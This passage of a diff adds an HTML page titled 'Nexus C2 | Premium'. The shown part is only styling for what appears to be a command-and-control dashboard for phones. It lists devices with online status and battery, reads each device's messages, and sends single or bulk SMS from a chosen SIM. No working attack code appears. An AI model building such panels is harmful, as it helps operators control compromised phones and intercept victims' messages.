@@ -1,0 +1,3256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus C2 | Premium</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><defs><linearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'><stop offset='0%25' stop-color='%2300f0ff'/><stop offset='100%25' stop-color='%230066ff'/></linearGradient></defs><rect width='100' height='100' rx='25' fill='url(%23g)'/><text x='50' y='73' font-family='sans-serif' font-weight='900' font-size='65' fill='%23000' text-anchor='middle'>N</text></svg>">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <style>
+        :root {
+            /* Premium Dark Theme */
+            --bg-base: #060913;
+            --bg-panel: #0A101D;
+            --bg-card: #111827;
+            --bg-hover: #1f2937;
+            
+            /* High Contrast Text */
+            --text-main: #ffffff;
+            --text-sec: #cbd5e1;
+            --text-muted: #94a3b8;
+            
+            /* Vibrant Accents */
+            --cyan: #00f0ff;
+            --cyan-dim: rgba(0, 240, 255, 0.15);
+            --green: #10b981;
+            --green-dim: rgba(16, 185, 129, 0.15);
+            --red: #ef4444;
+            --red-dim: rgba(239, 68, 68, 0.15);
+            --amber: #f59e0b;
+            --amber-dim: rgba(245, 158, 11, 0.15);
+            --purple: #8b5cf6;
+            --purple-dim: rgba(139, 92, 246, 0.15);
+            
+            /* Borders & Shadows */
+            --border: rgba(255, 255, 255, 0.08);
+            --border-light: rgba(255, 255, 255, 0.12);
+            --shadow-glow: 0 0 20px rgba(0, 240, 255, 0.1);
+            --shadow-drop: 0 8px 24px rgba(0,0,0,0.5);
+            
+            /* Dynamic Accent */
+            --accent: var(--cyan);
+            --accent-dim: var(--cyan-dim);
+            --accent-glow: 0 0 20px rgba(0, 240, 255, 0.1);
+            
+            --font-sans: 'Inter', system-ui, sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+            --radius-lg: 16px;
+            --radius-md: 10px;
+            --radius-sm: 6px;
+            --trans: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html { font-size: 16px; scrollbar-width: thin; scrollbar-color: var(--border) var(--bg-base); }
+        body { 
+            font-family: var(--font-sans); 
+            background: var(--bg-base); 
+            color: var(--text-main); 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ═══ SCROLLBAR ═══ */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+
+        /* ═══ HEADER ═══ */
+        .topbar {
+            height: 60px;
+            background: rgba(13, 19, 38, 0.8);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 24px; z-index: 100; flex-shrink: 0;
+        }
+        .topbar-left { display: flex; align-items: center; gap: 16px; }
+        .logo {
+            width: 36px; height: 36px; border-radius: 10px;
+            background: linear-gradient(135deg, var(--cyan), #0066ff);
+            color: #000; font-weight: 800; font-size: 18px;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: var(--shadow-glow);
+        }
+        .brand { font-size: 1.2rem; font-weight: 700; letter-spacing: 0.5px; }
+        .analytics-row {
+            display: flex; align-items: center; gap: 24px; margin-left: 32px; 
+            background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); 
+            padding: 8px 24px; border-radius: 12px; height: auto; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+        }
+        .pill-group { display: flex; gap: 10px; margin-left: 12px; }
+        .stat-pill {
+            padding: 4px 12px; border-radius: 20px; font-family: var(--font-mono);
+            font-size: 0.8rem; font-weight: 600; border: 1px solid;
+        }
+        .stat-pill.total { background: var(--cyan-dim); border-color: rgba(0,240,255,0.3); color: var(--cyan); }
+        .stat-pill.online { background: var(--green-dim); border-color: rgba(16,185,129,0.3); color: var(--green); }
+        .stat-pill.offline { background: rgba(148,163,184,0.1); border-color: rgba(148,163,184,0.2); color: var(--text-muted); }
+
+        .btn {
+            padding: 8px 16px; border-radius: var(--radius-sm); border: 1px solid var(--border);
+            background: var(--bg-card); color: var(--text-main); font-family: var(--font-mono);
+            font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: var(--trans);
+            display: inline-flex; align-items: center; gap: 8px;
+        }
+        .btn:hover { background: var(--bg-hover); border-color: var(--text-muted); }
+        .btn.primary { background: var(--cyan-dim); border-color: var(--cyan); color: var(--cyan); }
+        .btn.primary:hover { background: var(--cyan); color: #000; box-shadow: var(--shadow-glow); }
+
+        /* ═══ MAIN LAYOUT ═══ */
+        .workspace { display: flex; flex: 1; overflow: hidden; }
+
+        /* ═══ SIDEBAR ═══ */
+        .sidebar {
+            width: 320px; min-width: 260px; max-width: 600px;
+            background: var(--bg-panel); border-right: 1px solid var(--border);
+            display: flex; flex-direction: column; flex-shrink: 0; z-index: 10;
+            position: relative;
+        }
+        .sidebar-head { padding: 16px; border-bottom: 1px solid var(--border); }
+        
+        .resizer {
+            width: 5px; background: transparent; position: absolute;
+            top: 0; right: -3px; bottom: 0; cursor: col-resize; z-index: 20;
+            transition: background 0.2s;
+        }
+        .resizer:hover, .resizer.dragging { background: var(--cyan); }
+        
+        .search-box { position: relative; margin-bottom: 12px; }
+        .search-box input {
+            width: 100%; padding: 12px 16px; border-radius: var(--radius-sm);
+            background: var(--bg-card); border: 1px solid var(--border);
+            color: var(--text-main); font-family: var(--font-sans); font-size: 0.95rem;
+            transition: var(--trans); outline: none;
+        }
+        .search-box input:focus { border-color: var(--cyan); box-shadow: 0 0 0 3px var(--cyan-dim); }
+        .search-box input::placeholder { color: var(--text-muted); }
+
+        .filter-row { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; background: rgba(0,0,0,0.2); padding: 6px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.03); }
+        .f-btn {
+            flex: 1; padding: 10px 14px; border-radius: 8px; border: 1px solid transparent;
+            background: transparent; color: var(--text-muted);
+            font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+        .f-btn:hover { color: #fff; background: rgba(255,255,255,0.05); }
+        .f-btn.active { 
+            background: rgba(0, 240, 255, 0.1); color: var(--cyan); 
+            border-color: rgba(0, 240, 255, 0.3); box-shadow: 0 4px 12px rgba(0, 240, 255, 0.1); 
+            text-shadow: 0 0 8px rgba(0,240,255,0.4);
+        }
+        .f-btn.f-purple.active { background: rgba(168, 85, 247, 0.1); color: var(--purple); border-color: rgba(168, 85, 247, 0.3); box-shadow: 0 4px 12px rgba(168, 85, 247, 0.1); text-shadow: 0 0 8px rgba(168,85,247,0.4); }
+        .f-btn.f-amber.active { background: rgba(245, 158, 11, 0.1); color: var(--amber); border-color: rgba(245, 158, 11, 0.3); box-shadow: 0 4px 12px rgba(245, 158, 11, 0.1); text-shadow: 0 0 8px rgba(245,158,11,0.4); }
+        .f-btn.f-green.active { background: rgba(16, 185, 129, 0.1); color: var(--green); border-color: rgba(16, 185, 129, 0.3); box-shadow: 0 4px 12px rgba(16, 185, 129, 0.1); text-shadow: 0 0 8px rgba(16,185,129,0.4); }
+        .f-btn.f-red.active { background: rgba(239, 68, 68, 0.1); color: var(--red); border-color: rgba(239, 68, 68, 0.3); box-shadow: 0 4px 12px rgba(239, 68, 68, 0.1); text-shadow: 0 0 8px rgba(239,68,68,0.4); }
+
+        /* Custom Dropdown UI */
+        .dd-wrapper { position: relative; width: 100%; user-select: none; }
+        .dd-header {
+            width: 100%; padding: 12px 16px; border-radius: 10px;
+            background: linear-gradient(180deg, rgba(255,255,255,0.04) 0%, rgba(255,255,255,0.01) 100%);
+            border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            color: var(--text-main); font-family: var(--font-sans); font-size: 0.85rem;
+            cursor: pointer; display: flex; justify-content: space-between; align-items: center;
+            transition: all 0.3s ease; font-weight: 700;
+        }
+        .dd-header:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.15); box-shadow: 0 4px 15px rgba(0,0,0,0.3); color: #fff; }
+        .dd-header:hover { border-color: var(--cyan); }
+        .dd-header::after {
+            content: '▼'; font-size: 0.7rem; color: var(--cyan); transition: transform 0.2s;
+        }
+        .dd-wrapper.open .dd-header::after { transform: rotate(180deg); }
+        .dd-list {
+            position: absolute; top: 100%; left: 0; right: 0; margin-top: 6px;
+            background: rgba(13, 19, 38, 0.95); backdrop-filter: blur(8px); 
+            border: 1px solid var(--border-light);
+            border-radius: 8px; box-shadow: var(--shadow-drop); z-index: 100;
+            max-height: 250px; overflow-y: auto; display: none;
+            padding: 4px;
+            animation: fadeInDown 0.2s ease forwards;
+        }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .dd-wrapper.open .dd-list { display: block; }
+        .dd-item {
+            padding: 10px 14px; font-size: 0.85rem; font-weight: 600; cursor: pointer;
+            border-radius: 6px; transition: all 0.2s; display: flex; align-items: center;
+            color: var(--text-sec); margin-bottom: 2px;
+        }
+        .dd-item:last-child { margin-bottom: 0; }
+        .dd-item:hover { background: var(--bg-hover); color: var(--text-main); transform: translateX(2px); }
+
+        .list-header {
+            padding: 12px 16px; font-size: 0.75rem; font-weight: 700; color: var(--text-muted);
+            text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid var(--border);
+            background: rgba(13,19,38,0.9); position: sticky; top: 0; z-index: 2;
+        }
+
+        .device-list { flex: 1; overflow-y: auto; }
+        @keyframes shimmer {
+            0% { background-position: -400px 0; }
+            100% { background-position: 400px 0; }
+        }
+        .skel-block {
+            background: linear-gradient(90deg, rgba(0,240,255,0.02) 25%, rgba(0,240,255,0.15) 50%, rgba(0,240,255,0.02) 75%);
+            background-color: rgba(255,255,255,0.03);
+            background-size: 800px 100%;
+            animation: shimmer 1.5s infinite linear;
+        }
+        .device-card {
+            padding: 14px 16px; border-bottom: 1px solid rgba(255,255,255,0.03);
+            display: flex; align-items: center; gap: 14px; cursor: pointer;
+            transition: var(--trans); position: relative;
+        }
+        .context-menu {
+            position: fixed; background: rgba(10, 15, 30, 0.9); backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 240, 255, 0.2); border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            padding: 8px 0; z-index: 100000; width: 220px;
+            opacity: 0; pointer-events: none; transform: scale(0.95); transition: opacity 0.1s, transform 0.1s;
+        }
+        .context-menu.active { opacity: 1; pointer-events: auto; transform: scale(1); }
+        .c-header { padding: 4px 16px 8px; font-size: 0.7rem; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 4px; }
+        .c-item { padding: 10px 16px; font-size: 0.9rem; color: var(--text-main); cursor: pointer; display: flex; align-items: center; gap: 10px; transition: var(--trans); }
+        .c-item:hover { background: rgba(0, 240, 255, 0.1); color: var(--cyan); }
+        .c-item.danger:hover { background: rgba(239, 68, 68, 0.1); color: var(--red); }
+        .c-divider { height: 1px; background: rgba(255,255,255,0.05); margin: 4px 0; }
+        .device-card:hover { background: var(--bg-card); }
+        .device-card.active { 
+            background: linear-gradient(90deg, var(--accent-dim), transparent); 
+            border-left: 3px solid var(--accent); 
+            animation: pulseActive 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes pulseActive {
+            0%, 100% { border-left-color: var(--accent); box-shadow: inset 4px 0 10px var(--accent-dim); }
+            50% { border-left-color: var(--accent-dim); box-shadow: inset 2px 0 5px rgba(0,0,0,0); }
+        }
+
+        .d-icon {
+            width: 40px; height: 40px; border-radius: var(--radius-md);
+            background: var(--bg-card); border: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.2rem; position: relative; flex-shrink: 0;
+        }
+        .d-status {
+            position: absolute; bottom: -2px; right: -2px; width: 12px; height: 12px;
+            border-radius: 50%; border: 2px solid var(--bg-panel);
+        }
+        .d-status.on { background: var(--green); box-shadow: 0 0 8px var(--green); }
+        .d-status.off { background: var(--red); box-shadow: 0 0 8px rgba(239, 68, 68, 0.3); }
+
+        .d-info { flex: 1; min-width: 0; }
+        .d-id { font-family: var(--font-mono); font-size: 0.95rem; font-weight: 600; color: var(--text-main); margin-bottom: 4px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .d-sub { font-size: 0.8rem; color: var(--text-muted); display: flex; align-items: center; gap: 6px; }
+        .d-copy { 
+            background: none; border: none; color: var(--cyan); cursor: pointer; 
+            padding: 2px 4px; border-radius: 4px; transition: var(--trans);
+            display: flex; align-items: center; justify-content: center; opacity: 0;
+        }
+        .d-edit { 
+            background: none; border: none; color: var(--amber); cursor: pointer; 
+            padding: 2px 4px; border-radius: 4px; transition: var(--trans);
+            display: flex; align-items: center; justify-content: center; opacity: 0;
+        }
+        .device-card:hover .d-copy, .device-card:hover .d-edit { opacity: 1; }
+        .d-copy:hover { background: var(--cyan-dim); }
+        .d-edit:hover { background: var(--amber-dim); }
+        
+        .d-meta { text-align: right; }
+        .d-batt { font-family: var(--font-mono); font-size: 0.85rem; font-weight: 600; }
+        .d-src { margin-top: 4px; font-size: 0.7rem; padding: 2px 6px; border-radius: 4px; font-weight: 700; text-transform: uppercase; }
+        .src-p { background: var(--cyan-dim); color: var(--cyan); }
+        .src-b { background: var(--purple-dim); color: var(--purple); }
+
+        /* ═══ CONTENT AREA ═══ */
+        .content { 
+            flex: 1; display: flex; flex-direction: column; overflow: hidden;
+            background-color: var(--bg-base);
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(0, 240, 255, 0.05) 0%, transparent 70%),
+                radial-gradient(rgba(255, 255, 255, 0.06) 1px, transparent 1px);
+            background-size: 100% 100%, 24px 24px;
+            background-position: center top, 0 0;
+            animation: panGrid 60s linear infinite;
+        }
+        @keyframes panGrid {
+            0% { background-position: center top, 0 0; }
+            100% { background-position: center top, 0 24px; }
+        }
+        
+        .tabs {
+            display: flex; padding: 0 24px; border-bottom: 1px solid var(--border);
+            background: var(--bg-panel); flex-shrink: 0;
+        }
+        .tab {
+            padding: 16px 24px; font-size: 0.95rem; font-weight: 600; color: var(--text-muted);
+            cursor: pointer; border: none; background: none; transition: var(--trans);
+            position: relative;
+        }
+        .tab:hover { color: var(--text-sec); }
+        .tab.active { color: var(--text-main); }
+        .tab.active::after {
+            content: ''; position: absolute; bottom: -1px; left: 0; width: 100%;
+            height: 3px; background: var(--accent); border-radius: 3px 3px 0 0;
+            box-shadow: var(--accent-glow);
+        }
+
+        .pane { flex: 1; overflow-y: auto; padding: 24px; }
+
+        /* ═══ OVERVIEW TAB ═══ */
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; }
+        .stat-card {
+            background: #111827; border: 1px solid #374151; border-radius: 16px;
+            padding: 24px; position: relative; overflow: hidden;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.05), 0 8px 24px rgba(0,0,0,0.4);
+            display: flex; flex-direction: column; justify-content: center; min-height: 110px;
+        }
+        /* Left border accent */
+        .stat-card::after {
+            content: ''; position: absolute; top: 0; left: 0; width: 4px; height: 100%;
+        }
+        
+        .stat-card.c-cyan::after { background: var(--cyan); box-shadow: 0 0 16px var(--cyan); }
+        .stat-card.c-green::after { background: var(--green); box-shadow: 0 0 16px var(--green); }
+        .stat-card.c-purple::after { background: var(--purple); box-shadow: 0 0 16px var(--purple); }
+        .stat-card.c-amber::after { background: var(--amber); box-shadow: 0 0 16px var(--amber); }
+        .stat-card.c-red::after { background: var(--red); box-shadow: 0 0 16px var(--red); }
+        
+        .stat-title { font-size: 0.8rem; font-weight: 700; color: var(--text-sec); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px; z-index: 1; }
+        .stat-value { font-family: var(--font-mono); font-size: 3.2rem; font-weight: 800; color: #fff; line-height: 1; letter-spacing: -1.5px; text-shadow: 0 4px 16px rgba(0,0,0,0.5); z-index: 1; }
+        
+        /* ═══ DEVICE DETAILS TAB ═══ */
+        .detail-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
+        .detail-box {
+            background: #111827; border: 1px solid #374151;
+            border-radius: 16px; padding: 24px;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.05), 0 8px 24px rgba(0,0,0,0.4);
+        }
+        .detail-box h3 { font-size: 0.95rem; font-weight: 800; color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; letter-spacing: 0.5px; }
+        .detail-row {
+            display: flex; justify-content: space-between; padding: 12px 8px;
+            border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.9rem;
+            transition: all 0.2s ease; border-radius: 6px;
+        }
+        .detail-row:hover { background: rgba(255,255,255,0.03); transform: translateX(4px); }
+        .detail-row:last-child { border-bottom: none; }
+        .d-key { color: var(--text-muted); font-weight: 500; }
+        .d-val { font-family: var(--font-mono); color: var(--text-main); font-weight: 500; text-align: right; }
+        .v-cyan { color: var(--cyan); } .v-green { color: var(--green); } .v-amber { color: var(--amber); } .v-red { color: var(--red); }
+
+        /* ═══ CUSTOM MODALS ═══ */
+        .modal-overlay {
+            position: fixed; inset: 0; background: rgba(6,9,19,0.85); backdrop-filter: blur(8px);
+            display: flex; align-items: center; justify-content: center; z-index: 10000;
+            opacity: 0; pointer-events: none; transition: var(--trans);
+        }
+        .modal-overlay.active { opacity: 1; pointer-events: auto; }
+        
+        /* ═══ BULK SMS SPECIFICS ═══ */
+        .bulk-list { 
+            max-height: 250px; overflow-y: auto; 
+            background: #060913; border: 1px solid #1f2937; 
+            border-radius: 12px; margin-bottom: 20px; padding: 12px;
+            box-shadow: inset 0 4px 16px rgba(0,0,0,0.6);
+        }
+        .bulk-item { display: flex; align-items: center; padding: 12px; border-radius: 8px; cursor: pointer; transition: all 0.2s ease; border: 1px solid transparent; margin-bottom: 4px; }
+        .bulk-item:hover { background: rgba(255,255,255,0.03); border-color: rgba(255,255,255,0.05); transform: translateX(2px); }
+        .bulk-item input[type="checkbox"] { margin-right: 12px; accent-color: var(--cyan); width: 16px; height: 16px; cursor: pointer; }
+        .bulk-item .b-id { font-family: var(--font-mono); font-weight: 700; color: var(--text-main); flex: 1; }
+        .bulk-item .b-stat { font-size: 0.75rem; font-weight: 700; padding: 2px 6px; border-radius: 4px; }
+        .bulk-item .b-stat.on { color: var(--green); }
+        .bulk-item .b-stat.off { color: var(--red); }
+        
+        .bulk-ctrls { display: flex; gap: 8px; margin-bottom: 12px; }
+        .bulk-ctrl-btn { flex: 1; padding: 6px; background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-muted); border-radius: var(--radius-sm); font-size: 0.8rem; cursor: pointer; transition: var(--trans); }
+        .bulk-ctrl-btn:hover { color: var(--text-main); border-color: var(--cyan); }
+        .modal {
+            background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-lg);
+            padding: 24px; width: 100%; max-width: 400px; box-shadow: var(--shadow-drop);
+            transform: translateY(20px); transition: var(--trans);
+            max-height: 90vh; overflow-y: auto; margin: 16px;
+        }
+        .modal::-webkit-scrollbar { width: 4px; }
+        .modal::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 10px; }
+        .modal-overlay.active .modal { transform: translateY(0); }
+        .m-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 12px; color: var(--text-main); }
+        .m-desc { font-size: 0.9rem; color: var(--text-sec); margin-bottom: 20px; line-height: 1.5; }
+        .m-input {
+            width: 100%; padding: 12px 16px; border-radius: var(--radius-sm); margin-bottom: 20px;
+            background: var(--bg-panel); border: 1px solid var(--border);
+            color: var(--text-main); font-family: var(--font-mono); outline: none;
+        }
+        .m-input:focus { border-color: var(--cyan); }
+        .m-actions { display: flex; justify-content: flex-end; gap: 12px; }
+        .m-btn {
+            padding: 8px 16px; border-radius: var(--radius-sm); border: none; cursor: pointer;
+            font-weight: 600; font-family: var(--font-sans); transition: var(--trans);
+        }
+        .m-btn.cancel { background: transparent; color: var(--text-muted); }
+        .m-btn.cancel:hover { color: var(--text-main); background: rgba(255,255,255,0.05); }
+        .m-btn.confirm { background: var(--accent); color: #000; }
+        .m-btn.confirm:hover { box-shadow: var(--accent-glow); }
+
+        /* ═══ MESSAGES TAB ═══ */
+        .msg-header-bar {
+            display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px;
+            margin-bottom: 24px; padding: 16px 20px; background: var(--bg-panel);
+            border: 1px solid var(--border); border-radius: var(--radius-md);
+        }
+        .mhb-left { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; min-width: 0; }
+        .mhb-title { font-family: var(--font-mono); font-size: 1.2rem; font-weight: 700; color: var(--text-main); word-break: break-all; }
+        .mhb-badge { padding: 4px 12px; border-radius: 20px; background: var(--cyan-dim); color: var(--cyan); font-weight: 700; font-size: 0.85rem; white-space: nowrap; }
+        
+        .msg-filters { display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap; }
+        .msg-filters input {
+            flex: 1 1 200px; padding: 12px 16px; border-radius: var(--radius-sm);
+            background: var(--bg-panel); border: 1px solid var(--border);
+            color: var(--text-main); font-family: var(--font-sans); font-size: 0.95rem; outline: none;
+        }
+        .msg-filters input:focus { border-color: var(--cyan); }
+        .mf-btn {
+            padding: 8px 20px; border-radius: var(--radius-sm); border: 1px solid var(--border);
+            background: var(--bg-panel); color: var(--text-muted); font-weight: 600;
+            cursor: pointer; transition: var(--trans); flex-shrink: 0;
+        }
+        .mf-btn.active { background: var(--cyan-dim); color: var(--cyan); border-color: var(--cyan); }
+
+        .chat-list { display: flex; flex-direction: column; gap: 12px; }
+        .chat-msg {
+            background: var(--bg-card); border: 1px solid var(--border-light);
+            border-radius: var(--radius-md); padding: 16px 20px;
+            transition: var(--trans);
+        }
+        .chat-msg:hover { border-color: var(--cyan); box-shadow: 0 4px 20px rgba(0,0,0,0.2); transform: translateY(-1px); }
+        .chat-head { display: flex; align-items: center; margin-bottom: 12px; gap: 12px; flex-wrap: wrap; }
+        .chat-sender { font-family: var(--font-mono); font-size: 1.05rem; font-weight: 700; color: var(--cyan); word-break: break-all; }
+        .chat-badge { padding: 4px 8px; border-radius: 6px; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+        .chat-badge.in { background: var(--green-dim); color: var(--green); }
+        .chat-badge.out { background: var(--red-dim); color: var(--red); }
+        .chat-time { margin-left: auto; font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-muted); }
+        .chat-body {
+            font-size: 1rem; color: var(--text-main); line-height: 1.6;
+            padding-left: 14px; border-left: 3px solid var(--border-light);
+            word-break: break-word; white-space: pre-wrap;
+        }
+        .chat-msg:hover .chat-body { border-left-color: var(--cyan); }
+
+        /* ═══ ALL MESSAGES TABLE ═══ */
+        .table-wrap {
+            background: var(--bg-panel); border: 1px solid rgba(255,255,255,0.05);
+            border-radius: var(--radius-lg); overflow: auto; max-height: 100%;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th {
+            background: rgba(0,0,0,0.3); padding: 14px 24px; font-size: 0.75rem;
+            font-weight: 800; color: var(--text-sec); text-transform: uppercase;
+            letter-spacing: 1px; border-bottom: 1px solid rgba(255,255,255,0.1);
+            position: sticky; top: 0; z-index: 10;
+        }
+        td {
+            padding: 14px 24px; font-size: 0.95rem; color: var(--text-main);
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            transition: background 0.2s;
+        }
+        tr:hover td { background: rgba(255,255,255,0.03); }
+        .td-mono { font-family: var(--font-mono); }
+        
+        .hub-card {
+            background: #111827; 
+            border: 1px solid #374151;
+            border-radius: 12px; padding: 16px 20px; 
+            cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.05), 0 8px 24px rgba(0,0,0,0.4); 
+            display: flex; align-items: center; justify-content: space-between; gap: 16px;
+        }
+        .hub-card:hover {
+            background: #1f2937;
+            border-color: #4b5563; 
+            transform: translateY(-3px);
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.1), 0 12px 40px rgba(0,0,0,0.6);
+        }
+
+        /* ═══ SEND SMS ═══ */
+        .form-panel {
+            max-width: 700px; background: #111827; border: 1px solid #374151;
+            border-radius: 16px; padding: 32px;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.05), 0 8px 32px rgba(0,0,0,0.5);
+        }
+        .form-title { font-size: 1.5rem; font-weight: 700; color: var(--text-main); margin-bottom: 8px; }
+        .form-sub { font-size: 0.95rem; color: var(--text-muted); margin-bottom: 32px; }
+        
+        .sim-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px; }
+        .sim-card {
+            background: var(--bg-panel); border: 2px solid var(--border);
+            border-radius: var(--radius-md); padding: 16px; cursor: pointer;
+            transition: var(--trans); text-align: center;
+        }
+        .sim-card:hover { border-color: var(--text-muted); }
+        .sim-card.active {
+            border-color: var(--cyan); background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(0, 240, 255, 0.05));
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.15);
+        }
+        .sim-title { font-weight: 700; color: var(--text-main); margin-bottom: 4px; }
+        .sim-num { font-family: var(--font-mono); font-size: 0.9rem; color: var(--text-sec); }
+
+        .f-group { margin-bottom: 24px; }
+        .f-label { display: block; font-size: 0.85rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+        .f-input {
+            width: 100%; padding: 14px 16px; border-radius: var(--radius-sm);
+            background: var(--bg-panel); border: 1px solid var(--border);
+            color: var(--text-main); font-family: var(--font-mono); font-size: 1rem;
+            outline: none; transition: var(--trans);
+        }
+        .f-input:focus { border-color: var(--purple); box-shadow: 0 0 0 3px var(--purple-dim); }
+        .f-input::placeholder { color: rgba(255,255,255,0.35); font-weight: 400; font-family: var(--font-sans); }
+        .f-area { min-height: 120px; font-family: var(--font-sans); resize: vertical; }
+
+        .btn-send {
+            width: 100%; padding: 16px; border: none; border-radius: var(--radius-md);
+            background: linear-gradient(135deg, var(--purple), #ec4899);
+            color: #fff; font-size: 1.1rem; font-weight: 700; cursor: pointer;
+            transition: var(--trans); box-shadow: 0 4px 20px rgba(139,92,246,0.4);
+        }
+        .btn-send:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(139,92,246,0.6); }
+
+        /* ═══ LOADING & STATES ═══ */
+        .loading {
+            position: fixed; inset: 0; background: var(--bg-base);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 9999; transition: opacity 0.3s; gap: 20px;
+        }
+        .loading.hidden { opacity: 0; pointer-events: none; }
+        .spinner {
+            width: 50px; height: 50px; border: 4px solid var(--border-light);
+            border-top-color: var(--cyan); border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .empty-state {
+            height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            color: var(--text-muted); gap: 16px;
+        }
+        .empty-icon { font-size: 4rem; opacity: 0.5; }
+
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-up { animation: fadeUp 0.3s ease forwards; }
+
+        /* ═══ MOBILE RESPONSIVE ═══ */
+        .mobile-menu-toggle { display: none; font-size: 1.5rem; cursor: pointer; color: var(--text-main); padding: 8px; }
+        
+        @media (max-width: 768px) {
+            .workspace { flex-direction: column; min-height: 0; }
+            .sidebar { width: 100%; min-width: 100%; max-width: 100%; flex: 1; border-right: none; display: flex; flex-direction: column; overflow: hidden; }
+            .resizer { display: none; }
+            
+            /* Two-screen mobile flow */
+            .content { 
+                position: fixed; inset: 0; top: 60px; z-index: 50; 
+                background: var(--bg-base); transform: translateX(100%); 
+                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+                display: flex; flex-direction: column;
+            }
+            .content.mobile-active { transform: translateX(0); }
+            #mobileBackBtn { display: flex !important; flex-shrink: 0; }
+            
+            .list-edit-btn { display: none !important; }
+            
+            /* Topbar adjustments */
+            .topbar { padding: 0 12px; gap: 8px; }
+            .brand { display: none; } /* Hide brand text on mobile to save space */
+            .stat-pill.offline { display: none; } /* Hide offline stat to save space */
+            .pill-group { margin-left: 0; gap: 6px; }
+            
+            .analytics-row { 
+                margin-left: auto !important; padding: 6px 12px !important; gap: 12px !important; 
+                flex: 1; justify-content: space-around; 
+            }
+            .analytics-row [style*="font-size: 1.2rem"] { font-size: 1rem !important; }
+            .analytics-row [style*="font-size: 0.65rem"] { font-size: 0.55rem !important; }
+            
+            .mobile-menu-toggle { display: block; flex-shrink: 0; margin-left: 8px; }
+            .topbar-right {
